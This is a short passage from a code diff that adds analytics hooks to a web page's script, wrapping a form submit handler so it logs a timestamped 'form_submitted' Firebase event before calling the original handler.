+                        logFirebaseEvent('form_submitted', {
+                            timestamp: new Date().toISOString(),
+                            formStatus: 'submitted'
+                        });
+                        return originalHandleSubmit.call(this, e);
+                    };
+                }
+            } catch (error) {
+                console.log('Analytics hooks (optional):', error.message);
+            }
+        }, 500);
+    </script>
+</body>
+</html>
